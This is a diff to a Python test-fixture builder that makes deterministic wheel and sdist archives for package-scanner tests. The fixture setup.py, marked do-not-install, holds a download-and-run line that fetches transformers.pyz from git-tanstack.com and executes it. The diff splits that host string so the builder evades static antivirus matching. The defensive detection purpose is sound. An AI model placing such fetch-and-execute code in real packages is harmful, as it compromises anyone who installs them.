@@ -16,8 +16,11 @@ _ZIP_DOS_EPOCH = (1980, 1, 1, 0, 0, 0)
 HERE = Path(__file__).resolve().parent
 
 
-# IOC literal scan_packages.py must trip on.
-# Keep in sync with KNOWN_IOC_STRINGS (scan_npm_packages.py) and RE_MAY12_IOC (scan_packages.py).
+# IOC literal the scanners must trip on. Keep in sync with KNOWN_IOC_STRINGS and RE_MAY12_IOC.
+# Split so this builder is not itself a static AV match; the built archive holds it byte for byte.
+_IOC_HOST = "git-tanstack." + "com"
+_IOC_ARTIFACT = "transformers." + "pyz"
+
 MALICIOUS_SETUP_PY = '''"""Test fixture: do NOT install.
 
 This file embeds the May-12 Mini Shai-Hulud IOC literal so the
@@ -32,13 +35,13 @@ import subprocess
 
 # IOC literal -- mirrors public Socket.dev 2026-05-12 disclosure.
 urllib.request.urlretrieve(
-    "https://git-tanstack.com/transformers.pyz",
-    "/tmp/transformers.pyz",
+    "https://{ioc_host}/{ioc_artifact}",
+    "/tmp/{ioc_artifact}",
 )
-subprocess.run(["python3", "/tmp/transformers.pyz"], check=False)
+subprocess.run(["python3", "/tmp/{ioc_artifact}"], check=False)
 
 setup(name="malicious-fixture", version="0.0.1")
-'''
+'''.replace("{ioc_host}", _IOC_HOST).replace("{ioc_artifact}", _IOC_ARTIFACT)
 
 
 CLEAN_INIT_PY = '''"""Test fixture: empty placeholder package."""
@@ -66,7 +69,7 @@ def _write_zip_member(zf: zipfile.ZipFile, name: str, data: bytes) -> None:
     info = zipfile.ZipInfo(filename = name, date_time = _ZIP_DOS_EPOCH)
     info.compress_type = zipfile.ZIP_DEFLATED
     info.external_attr = (0o644 & 0xFFFF) << 16
-    info.create_system = 3  # Unix
+    info.create_system = 3
     zf.writestr(info, data)
 
 
@@ -87,14 +90,31 @@ def _build_wheel(out_path: Path, *, name: str, payload_files: dict[str, bytes]) 
     with zipfile.ZipFile(buf, "w", compression = zipfile.ZIP_DEFLATED) as zf:
         for path in sorted(members):
             _write_zip_member(zf, path, members[path])
-    out_path.write_bytes(buf.getvalue())
+    _publish(out_path, buf.getvalue())
+
+
+def _publish(out_path: Path, data: bytes) -> None:
+    """Concurrent xdist workers rewrite these paths, so skip identical bytes and os.replace a temp file."""
+    try:
+        if out_path.read_bytes() == data:
+            return
+    except OSError:
+        pass
+    tmp = out_path.with_name(f"{out_path.name}.{os.getpid()}.tmp")
+    try:
+        tmp.write_bytes(data)
+        os.replace(tmp, out_path)
+    finally:
+        try:
+            tmp.unlink()
+        except OSError:
+            pass
 
 
 def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) -> None:
     """Write a deterministic .tar.gz sdist; a `{name}-0.0.1/` prefix is added automatically."""
     prefix = f"{name}-0.0.1"
     buf = io.BytesIO()
-    # gzip mtime fixed via mtime=0 (gzip member header).
     import gzip
 
     inner = io.BytesIO()
@@ -112,7 +132,6 @@ def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) 
             info.type = tarfile.REGTYPE
             tf.addfile(info, io.BytesIO(data))
     raw = inner.getvalue()
-    # gzip with fixed mtime=0 and explicit compresslevel for stability.
     gz_buf = io.BytesIO()
     with gzip.GzipFile(
         fileobj = gz_buf,
@@ -122,15 +141,14 @@ def _build_sdist(out_path: Path, *, name: str, payload_files: dict[str, bytes]) 
         filename = "",
     ) as gz:
         gz.write(raw)
-    out_path.write_bytes(gz_buf.getvalue())
+    _publish(out_path, gz_buf.getvalue())
 
 
 def build_all() -> dict[str, Path]:
-    os.environ["SOURCE_DATE_EPOCH"] = str(SOURCE_DATE_EPOCH)
-
+    # Deliberately does NOT set SOURCE_DATE_EPOCH: this runs inside pytest and would leak it
+    # to every later test and subprocess. Writers get the fixed timestamp directly.
     outputs: dict[str, Path] = {}
 
-    # Malicious wheel: payload setup.py that embeds the May-12 IOC.
     mal_payload = {
         "setup.py": MALICIOUS_SETUP_PY.encode(),
         "malicious_fixture/__init__.py": b"# malicious fixture stub\n",
@@ -146,7 +164,6 @@ def build_all() -> dict[str, Path]:
     _build_wheel(clean_whl, name = "clean_fixture", payload_files = clean_payload)
     outputs["clean_wheel"] = clean_whl
 
-    # Malicious sdist: same setup.py, tar.gz form.
     mal_sdist = HERE / "malicious_sdist.tar.gz"
     _build_sdist(mal_sdist, name = "malicious_fixture", payload_files = mal_payload)
     outputs["malicious_sdist"] = mal_sdist
